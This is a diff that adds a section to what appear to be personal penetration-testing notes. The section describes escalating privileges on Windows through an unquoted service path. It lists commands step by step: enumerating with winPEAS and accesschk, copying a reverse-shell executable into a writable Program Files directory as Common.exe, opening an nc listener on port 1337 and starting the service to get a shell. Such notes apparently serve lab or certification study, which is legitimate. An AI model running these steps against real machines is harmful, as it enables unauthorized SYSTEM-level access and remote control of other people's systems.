@@ -98,7 +98,36 @@ net start <service>
 
 DONE PRIVESC
 
+                                                                   Unquoted Service Path
+run winpeas.exe to search for unquoted service path's:
+winPEASany.exe quiet servicesinfo 
 
+next check permissions on the service with an unquoted path:
+accesschk.exe /accepteula -ucqv <user> <service>
 
+make sure you see this ouput from the above command:
+SERVICE_START
+SERVICE_STOP
 
+next use accesschk to figure out your permissions on the directories leading up to the service:
+accesschk.exe /accepteula -uwdq C:\
+
+accesschk.exe /accepteula -uwdq "C:\Program Files\"
+
+accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+
+in the output from the above command wait until it shows RW for the user your group belongs too*
+
+copy your reverse shell to the writeable directory and rename it common.exe:
+copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+set up a listner on the attacking machine:
+nc -nlvp 1337
+
+finally sart the service:
+net start <service>
+
+PRIVESC DONE
+
+                                                                  
 
